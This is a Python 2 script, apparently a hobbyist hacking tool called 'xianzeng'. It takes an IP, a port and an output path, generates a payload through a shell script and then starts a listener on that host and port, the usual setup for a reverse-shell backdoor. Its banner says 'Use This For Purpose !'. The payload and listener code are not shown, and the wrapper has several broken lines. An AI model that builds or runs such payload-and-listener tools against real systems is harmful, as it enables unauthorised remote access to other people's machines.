try:
	import random
	import sys
	import argparse
	import os
	import subprocess,time
	from time import sleep
except ImportError as e:
	print "     [!] Import Module Error [!]"
	sleep(2)
	print "     [!] Install The Module > %s"%s(e)
	sleep(2)
	print "     [!] Ready to Install The Module ? [!]"
	sleep(2)
	res = raw_input("Y/N")
	if res == "Y" or res == "y":
		os.system("pkg install "+e)
	elif res == "N" or res == "n":
		print "     [+] Opening The Tools [+]"
		sleep(5)
		print "     [!] Tools Error without module [!] > %s"%(e)
		sys.exit()
os.system("clear")

def n(o):
 for x in o + "\n":
  sys.stdout.write(x)
  sys.stdout.flush()
  time.sleep(random.random() * 0.1)
		
nani = " "		
		
r = "\033[;31m"
g = "\033[;32m"
y = "\033[;33m"
b = "\033[;34m"
e = "\033[;0m"
		
def banner():
	os.system("clear")
	n(r+"""
    _  _ _ ____ _  _ ___  ____ _  _ ____ 
     \/  | |__| |\ |   /  |___ |\ | | __"""+e+"""
    _/\_ | |  | | \|  /__ |___ | \| |__] 

    
    """+g+"""Author : X14N23N6
    Date : 09-03-2018
    Usage : python xianzeng.py (ip) (port) (output)
    ex: python xianzeng.py 127.0.0.1 8080 /sdcard/xianjay.py
    if payload was created :
    python xianzeng.py run
    if error please say to me .
    
	"""+e)

try:
	system = sys.argv[1]
	host = sys.argv[1]
	port = sys.argv[2]
	output = sys.argv[3]
except IndexError:
	os.system("clear")
	print r+"     [!] Error The Field [!]"+e
	banner()
	sys.exit()

def new():
	n(r+"""
    _  _ _ ____ _  _ ___  ____ _  _ ____
     \/  | |__| |\ |   /  |___ |\ | | __"""+e+"""
    _/\_ | |  | | \|  /__ |___ | \| |__] 
    
    """)

def PKIanjing():
	global host, port, output, system, nani
	nani = system.split()[-1]
	for kaw in nani:
		if (kaw == "run" or kaw == "start"):
			if host != " " and port != " " and output != " ":
				if os.name == "nt":
					subprocess.Popen([sys.executable, 'sys/listen.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
				else:
					os.system(sys.executable + " sys/listen.py %s %s"%(host, str(port)))
	n(g+"     [+] Wait [+]"+e)
	n(g+"     [+] Creating The Payload [+]"+e)
	sleep(0.3)
	os.system("sh generate.sh "+host+" "+port+" "+output)
	n(g+"     [+] Payload Has Been Created [+]"+e)
	sleep(0.2)
	n(g+"       [+] Patching The System [+]"+e)
	sleep(0.2)
	n(g+"       [+] Checking The System [+]"+e)
	sleep(0.3)
	n(r+"       [+] Use This For Purpose ! [+]"+e)
	sleep(0.2)
	n(y+"     [!] Opening The Payload [!]"+e)
	sleep(0.2)
	n(g+"     [+] Listening Start [+]"+e)
	sleep(0.2)
	if host != " " and port != " ":
		if os.name == "nt":
			subprocess.Popen([sys.executable, 'systemlisten.py', host, port], creationflags=subprocess.CREATE_NEW_CONSOLE)
		else:
			os.system(sys.executable + " systemlisten.py %s %s"%(host, port))
			
			

	
def raos():
	try:
		new()
		PKIanjing()
	except KeyboardInterrupt:
		n(r+"     [!] Exit [!]"+e)
		sys.exit()
	except EOFError:
		n(r+"     [!] Exit [!]"+e)
		sys.exit()
	except sys.argv:
		sys.exit()



if __name__ == "__main__":
	raos()